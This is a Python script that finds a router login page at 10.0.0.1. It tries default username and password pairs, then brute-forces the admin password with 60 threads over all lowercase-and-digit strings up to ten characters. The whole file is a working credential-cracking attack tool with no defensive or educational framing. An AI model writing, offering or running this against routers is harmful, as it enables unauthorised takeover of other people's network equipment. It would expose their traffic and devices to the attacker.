import itertools
import string
import requests
from concurrent.futures import ThreadPoolExecutor

COMMON_IPS = ["10.0.0.1"]
DEFAULT_USERNAMES = ["admin", "cusadmin"]
DEFAULT_PASSWORDS = ["password", "admin", "1234"] 
MAX_THREADS = 60 

def find_router_endpoint():
    """
    Attempts to connect to common router IPs to find the login page.
    """
    for ip in COMMON_IPS:
        url = f"http://{ip}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"Router found at {url}")
                return url
        except requests.exceptions.RequestException:
            pass
    print("No router login page found.")
    return None

def system_check(session, router_url, username, password):
    """
    Tries to log in to the router with provided credentials.
    """
    payload = {"username": username, "password": password} 
    try:
        response = session.post(router_url, data=payload, timeout=5)
        if "Dashboard" in response.text:
            return True
    except requests.exceptions.RequestException:
        pass
    return False

def brute_force_password(router_url, max_length):
    """
    Brute forces the password if default credentials fail, using multithreading for speed.
    """
    characters = string.ascii_lowercase + string.digits
    session = requests.Session() 

    def try_password_combination(combination):
        attempt_password = ''.join(combination)
        for username in DEFAULT_USERNAMES:
            if system_check(session, router_url, username, attempt_password):
                print(f"Password found: {attempt_password}")
                return attempt_password
        return None

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for length in range(1, max_length + 1):
            combinations = itertools.product(characters, repeat=length)
            future_to_password = {executor.submit(try_password_combination, combo): combo for combo in combinations}
            for future in future_to_password:
                result = future.result()
                if result:
                    executor.shutdown(wait=False)
                    return result
    print("Password not found within the given length.")
    return None

router_url = find_router_endpoint()
if router_url:
    session = requests.Session()
    for username in DEFAULT_USERNAMES:
        for password in DEFAULT_PASSWORDS:
            print(f"Trying default credentials: {username}/{password}")
            if system_check(session, router_url, username, password):
                print(f"Default credentials found: {username}/{password}")
                exit(0)

    max_password_length = 10  # Adjust based on expected password complexity
    brute_force_password(router_url, max_password_length)
else:
    print("Unable to locate the router.")
